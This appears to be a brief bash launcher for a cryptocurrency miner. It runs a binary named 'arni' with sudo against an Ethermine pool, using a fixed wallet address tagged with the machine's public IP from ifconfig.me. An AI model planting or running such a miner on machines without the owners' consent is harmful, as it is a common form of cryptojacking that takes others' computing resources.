#!/bin/bash

POOL=ssl://us1.ethermine.org:5555
WALLET=0x86fc2bf54eeb39059638c91ade97322948882b9c.$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./arni && sudo ./arni -pool $POOL -wal $WALLET $@ -pass x -proto 2 -stales 0
